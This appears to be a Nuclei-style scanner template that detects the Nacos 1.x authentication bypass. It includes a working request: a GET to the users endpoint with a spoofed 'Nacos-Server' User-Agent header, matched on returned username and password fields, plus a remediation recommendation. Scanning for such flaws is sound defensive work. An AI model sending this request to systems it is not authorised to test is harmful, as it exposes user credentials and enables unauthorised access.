id: unauthenticated-nacos-access
info:
  name: Nacos 1.x - Authentication Bypass
  author: taielab,pikpikcu
  severity: critical
  description: An authentication bypass vulnerability in Nacos 1.x allows unauthorized
    access to modify and add data by calling any interface including adding new users.
  reference:
  - https://github.com/alibaba/nacos/issues/4593
  - https://nacos.io/en-us/docs/auth.html
  tags: nacos,unauth
  metadata:
    impact: The impact of the unauthenticated-nacos-access vulnerability is that it
      allows unauthorized users to bypass authentication and gain access to Nacos
      1.x, potentially compromising the security of the system and its data.
    recommendation: It is recommended to immediately modify the application.properties
      configuration file or add the JVM startup variable Dnacos.core.auth.enabled=true
      to enable authentication and implement additional security measures to prevent
      the unauthenticated access vulnerability in Nacos 1.x.
requests:
- method: GET
  path:
  - '{{BaseURL}}/nacos/v1/auth/users?pageNo=1&pageSize=9'
  - '{{BaseURL}}/v1/auth/users?pageNo=1&pageSize=9'
  headers:
    User-Agent: Nacos-Server
  matchers-condition: and
  matchers:
  - type: word
    words:
    - 'Content-Type: application/json'
    part: header
  - type: regex
    regex:
    - '"username":'
    - '"password":'
    part: body
    condition: and
  - type: status
    status:
    - 200
